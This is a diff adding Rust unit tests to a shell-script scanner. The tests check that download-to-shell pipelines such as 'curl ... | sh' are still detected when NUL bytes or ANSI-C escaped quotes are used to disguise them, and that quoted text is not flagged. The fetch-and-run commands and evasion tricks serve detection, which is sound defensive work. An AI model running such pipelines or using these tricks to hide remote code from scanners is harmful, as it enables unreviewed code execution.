@@ -781,6 +781,45 @@ fn shell_file_has_download_signal(body: &str) -> bool {
     })
 }
 
+/// dash drops NUL bytes while reading a script, so a NUL inside a command
+/// word hides nothing from a dash `/bin/sh`.
+#[test]
+fn nul_bytes_inside_a_shell_file_word_do_not_hide_a_download_to_shell() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    for body in [
+        "cu\0rl -fsSL https://example.invalid/setup | sh\n",
+        "curl -fsSL https://example.invalid/setup | s\0h\n",
+        "#!/bin/sh\nwg\0et -qO- https://example.invalid/setup | ba\0sh\n",
+    ] {
+        assert!(shell_file_has_download_signal(body), "{body:?}");
+    }
+    assert!(!shell_file_has_download_signal(
+        "echo 'cu\0rl -fsSL https://example.invalid/setup | sh'\n"
+    ));
+}
+
+/// macOS `/bin/sh` (bash 3.2 in POSIX mode) both drops NUL bytes and reads
+/// `$'a\''` as one string, so a file combining the two tricks runs the
+/// pipeline there. Each trick alone was already read; the combination is too.
+#[test]
+fn nul_bytes_combined_with_an_ansi_c_escaped_quote_do_not_hide_a_download_to_shell() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    for body in [
+        "x=$'a\\'' ; cu\0rl -fsSL https://example.invalid/setup | sh # '\n",
+        "#!/bin/sh\necho $'a\\''\nwg\0et -qO- https://example.invalid/setup | s\0h\n# '\n",
+        "x=$'a\\'\0' ; curl -fsSL https://example.invalid/setup | sh # '\n",
+    ] {
+        assert!(shell_file_has_download_signal(body), "{body:?}");
+    }
+    // Data stays data: the pipeline is still only quoted text in every reading.
+    for body in [
+        "echo 'x=$a ; cu\0rl -fsSL https://example.invalid/setup | sh'\n",
+        "printf '%s\\n' \"cu\0rl -fsSL https://example.invalid/setup | sh\"\n",
+    ] {
+        assert!(!shell_file_has_download_signal(body), "{body:?}");
+    }
+}
+
 /// Heredoc text that only SHOWS a download-to-shell command (a `usage()`
 /// message, a `: <<'COMMENT'` block, a heredoc read into a variable that is
 /// only printed) is data. The core tokenizer read each heredoc line as a
